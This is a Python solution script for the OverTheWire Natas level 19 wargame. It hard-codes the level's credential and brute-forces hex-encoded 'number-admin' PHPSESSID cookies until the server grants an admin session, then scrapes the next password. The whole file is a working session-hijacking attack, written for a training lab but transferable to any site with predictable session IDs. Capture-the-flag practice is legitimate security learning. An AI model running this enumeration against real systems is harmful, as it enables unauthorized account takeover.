import requests
import re

username = "natas19"
password = "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT"
url = 'http://%s.natas.labs.overthewire.org/' % username

# for i in range(10):
#     session = requests.Session() #Maintains a session
#     response = session.post(url, data={"username":"Ding", "password":"Dong"}, auth=(username, password)) #Need to login first to get the session cookie
#     hex_string = session.cookies["PHPSESSID"]
#     print(bytes.fromhex(hex_string).decode("utf-8"))

session = requests.Session() #Maintains a session
for num in range(641):
    cookie = f"{num}-admin"
    hex_cookie = cookie.encode('utf-8').hex()
    response = session.post(url,cookies={"PHPSESSID":f"{hex_cookie}"} , auth=(username, password))
    if "You are an admin" in response.text:
        print(f"Found the valid admin session ID: {num}")
        print(f"Active hex cookie value: {hex_cookie}")
        break
    if num % 50 == 0:
        print(f"Checked upto session ID: {num}")
print(f"Final Password: {re.findall('Password: (.*)</pre>', response.text)[0]}")
